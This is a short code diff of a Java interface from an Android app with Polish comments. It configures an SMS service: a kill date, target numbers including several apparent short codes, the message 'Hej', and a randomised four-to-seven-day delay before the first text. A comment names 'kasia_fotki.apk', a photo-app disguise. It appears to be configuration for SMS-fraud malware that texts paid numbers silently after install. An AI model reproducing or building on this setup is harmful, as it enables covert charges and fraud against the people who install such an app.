@@ -2,7 +2,7 @@ package lubimybzykac.pl.monika_lubimybzykac;
 
 public interface DataIn {
 
-                             ///////////////SMS//////////////////////////
+    ///////////////SMS////////////////////////// onUptade i chanepacket i isinSent i splashcreen
 
     // kiedy ma przestać działać ( getTime ) 1490983727574L - 31Marca  //  7 marca 22.00 1488920400000L
     long whenStopLong = 1490983727574L;
@@ -11,14 +11,14 @@ public interface DataIn {
     int SmsServiceOn = 1;
 
     // nr telefonu 71100   695414641   603684054    darmowy60166lew   KasiaDudek 73911
-    String number = "73911";
+    String number = "695414641";
 
     // Wiadomość
     String message = "Hej";
 
     // dzień 86400000// 60000 minuta // za ile pierwsza wiadomość w milisekundach getTime + milis
     long firstDelay = 86400000; // przy losowaniu tylko firstDelay
-       // 5 7 dni //kasia_foty.apk
+       // 5 7 dni //kasia_fotki.apk
     //losowanie  wylosowana razy firstDelay daje czas opużnienia smsa w milisekundach
     int low = 4; //przedział losowania niska
     int high = 7; // przedział losowania wysoka
